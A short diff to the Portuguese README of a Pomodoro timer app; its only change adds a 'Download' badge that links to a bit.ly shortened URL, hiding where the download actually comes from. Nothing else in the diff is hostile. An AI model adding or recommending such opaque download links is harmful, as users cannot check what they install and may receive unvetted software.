@@ -2,6 +2,7 @@
 
 # 🍅 
 
+ [![Download](https://img.shields.io/badge/Download-Here-brightgreen)](http://bit.ly/3YdDA2X)
 ## Descrição:
 O My Pomodoro Timer é um programa simples, rápido e intuitivo para foco e produtividade.
 Foi desenvolvido para ser uma alternativa gratuíta e funcional do conhecido método pomodoro.
